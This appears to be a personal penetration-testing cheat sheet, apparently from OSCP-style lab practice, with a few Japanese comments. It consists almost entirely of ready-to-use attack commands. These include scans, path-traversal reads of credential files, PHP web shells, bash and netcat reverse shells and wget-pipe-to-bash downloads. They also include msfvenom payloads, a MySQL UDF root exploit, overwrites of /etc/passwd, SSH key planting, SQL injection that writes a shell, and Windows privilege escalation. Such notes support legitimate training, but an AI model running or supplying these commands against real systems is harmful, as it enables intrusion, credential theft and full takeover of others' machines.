sudo nmap -sU
nmap -Pn --script vuln 192.168.1.105
nmap 10.11.1.7 --script=rdp-vuln-ms12-020.nse
unicornscan 10.11.1.50 -p 1-65000 -v
nmap -sSV -p- --defeat-rst-ratelimit

nmap --script smb-os-discovery.nse 10.11.1.227 -T 4

curl --user '' --upload-file file "http://exploit.com/file"

rpcclient -U "" 10.11.1.227

# elastix
/vtigercrm
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

# Windows
Windows : Program Filesは見ること
systeminfo
hostname
net users
net user "name of user"
netsh firewall show config
tasklist /SVC
tasklist
net start

# linux
SUIDを持つファイルを確認する

set VERBOSE true

path=../../../../../../../../../../xampp/security/webdav.htpasswd
webdav.passwd

set AutoRunScript post/windows/manage/migrate

run post/windows/gather/hashdump
https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/

use post/multi/manage/shell_to_meterpreter
msf post(shell_to_meterpreter) > set session 1
msf post(shell_to_meterpreter) > exploit

<?php echo shell_exec($_GET['cmd']);?>
echo '<?php system(\$_GET['cmd']); ?>' > exploit.php

# wp
wpscan --url sandbox.local --enumerate ap,at,cb,dbe
curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://10.11.0.4/shell.elf
curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf

davtest -url http://10.11.1.229/test1 -uploadfile /root/Documents/229/hi.html -uploadloc hi.html
davtest -url http://localhost/davdir

# mysql
https://www.exploit-db.com/exploits/1518
cat - > raptor_udf2.c

 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;
 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
 * mysql> select do_system('echo root::0:0:root:/root:/bin/bash > /etc/passwd');

 * mysql> \! sh

https://www.exploit-db.com/exploits/46044

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
    setuid(0); setgid(0); system("/bin/bash");
}

curl "https://192.168.161.44/uploads/shell.php?cmd=wget%20192.168.119.161%20-O%20-|bash" -v --insecure
bash -c 'bash -i >& /dev/tcp/192.168.119.161/443 0>&1'

echo apache:x:0:0:root:/root:/bin/bash >> /etc/passwd
echo root::0:0:root:/root:/bin/bash > /etc/passwd

cat >fusermount.c<<EOF
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char **argv)
{
  setreuid(0,0);
  system("/usr/bin/touch /w00t");
  return(0);
}
EOF

# smb
nmap --script smb-os-discovery.nse -p445,139 -v 10.11.1.115

cp  /bin/bash /tmp/exploit;chmod+s /tmp/exploit /tmp/exploit -p 

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali" > /root/.ssh/authorized_keys

# pattern

msf-pattern_create -l 3000
msf-pattern_offset -l 3000 -q

# jmp esp

!mona modules
!mona jmp -r esp –cpb '\x00\x0a\x0d
!mona find -s "\xff\xe4" -m
!mona find "\xff\xe4" -m essfunc.dll

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.210.134 LPORT=443 -f python -v buf c –e x86/shikata_ga_nai -b "\x0a\x0c\x00\x0a\x0d"

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.XX.43 LPORT=1337 -f c -a x86 --platform windows -b "\x0a\x0c\x00\x0a\x0d"

badchars = ( 
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff") 


# flag
type "C:\Documents and Settings\Administrator\Desktop\proof.txt"


<?php
$output = `bash -i >& /dev/tcp/10.11.0.198/1234 0>&1`;
echo "<pre>$output</pre>";
?>

uname -mrs

showmount -e 10.11.1.72
mount -t nfs 10.11.1.72:/ /tmp
mount -t nfs 192.168.XX.53:/ /tmp/mnt -no lock


msfvenom -p - -b \x00 -a x86 --platform Windows -e x86/shikata_ga_nai -f python

# migrate

run post/windows/manage/migrate

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.XX.XX LPORT=443 -f exe -a x86 --platform win > WScheduler.exe

mysql -u root -h host -p
UPDATE `wp_users` SET `user_pass`= MD5('bypassed') WHERE `user_login`='admin';

gobuster -u http://192.168.XX.46:8081 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x txt,php,asp,db

..\..\..\..\xampp\htdocs\blog\wp-config.php
select * from wp_users
http://10.11.1.252:8000/edit_user.php?user_id=-7579 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE '/var/www/html/shell.php'


https://www.exploit-db.com/exploits/1518
select do_system('echo root::0:0:root/root:/bin/bash > /etc/passwd');

netstat -ant

# snmp
snmpwalk -v 1 -c public

proxychains curl ip:port

https://www.exploit-db.com/exploits/45072
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.XX.XX LPORT=443 -f exe -a x86 --platform win > WScheduler.exe

echo 'os.execute("nc -e /bin/sh 192.168.XX.XX 445")' > /var/tmp/shell.nse && sudo nmap --script /var/tmp/shell.nse

echo root::0:0:root:/root:/bin/bash > /etc/passwd

<?php echo exec(‘nc -lvnp 9000 > shell.php 2>&1’); ?>.php

echo C:\Users\user\Desktop\nc.exe
192.168.123.123 12345 -e cmd.exe > rev.bat

JuicyPotato.exe -l 9997 -p C:\Users\user\Desktop\rev.bat -t * -c
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}

https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Pro

https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf
"<?php+file_put_contents('nc.bat',file_get_contens('http://192.168.XX.XX/nc.txt'));system('nc.bat');usleep(2000000);system('nc.exe+-vn+192.168.XX.XX+1234+-cmd.exe');+?>"

http://192.168.XX.218/8678576453/rooms/get.php\?name=shell1.php\&ROOM\="<?php+file
_put_contents('nc.bat',file_get_contens('http://192.168.XX.XX/nc.txt'));system('nc.bat');usl
eep(2000000);system('nc.exe+-vn+192.168.XX.XX+1234+-cmd.exe');+?>"